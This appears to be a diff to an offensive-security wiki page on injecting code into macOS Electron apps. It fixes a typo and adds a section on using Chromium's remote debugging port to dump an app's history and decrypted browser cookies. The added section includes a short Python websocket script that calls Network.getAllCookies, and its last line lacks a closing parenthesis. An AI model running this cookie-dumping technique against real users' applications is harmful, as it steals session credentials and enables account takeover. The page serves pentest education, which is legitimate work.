@@ -19,7 +19,7 @@ And node has some **parameters** and **env variables** that can be use to **make
 
 ### Electron Fuses
 
-These techniques will be discussed next, but in recent times Electron has added several **security flags to prevent them**. These are the [**Electron Fueses**](https://www.electronjs.org/docs/latest/tutorial/fuses) and these are the ones used to **prevent** Electron apps in macOS from **loading arbitrary code**:
+These techniques will be discussed next, but in recent times Electron has added several **security flags to prevent them**. These are the [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) and these are the ones used to **prevent** Electron apps in macOS from **loading arbitrary code**:
 
 * **`RunAsNode`**: If disabled, it prevents the use of the env var **`ELECTRON_RUN_AS_NODE`** to inject code.
 * **`EnableNodeCliInspectArguments`**: If disabled, params like `--inspect`, `--inspect-brk` won't be respected. Avoiding his way to inject code.
@@ -180,8 +180,20 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% hint style="danger" %}
 If the fuse**`EnableNodeCliInspectArguments`** is disabled, the app will **ignore node parameters** (such as `--inspect`) when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set, which will be also **ignored** if the fuse **`RunAsNode`** is disabled.
 
-However, you could still use the electron param `--remote-debugging-port=9229` but the previous payload won't work to execute other processes.
+However, you could still use the **electron param `--remote-debugging-port=9229`** but the previous payload won't work to execute other processes.
 {% endhint %}
+
+Using the param **`--remote-debugging-port=9222`** it's possible to steal some information from the Electron App like the **history** (with GET commands) or the **cookies** of the browser (as they are **decrypted** inside the browser and there is a **json endpoint** that will give them).
+
+You can learn how to do that in [**here**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) and [**here**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) and use the automatic tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) or a simple script like:
+
+```python
+import websocket
+ws = websocket.WebSocket()
+ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
+ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
+print(ws.recv()
+```
 
 ### Injection from the App Plist
 
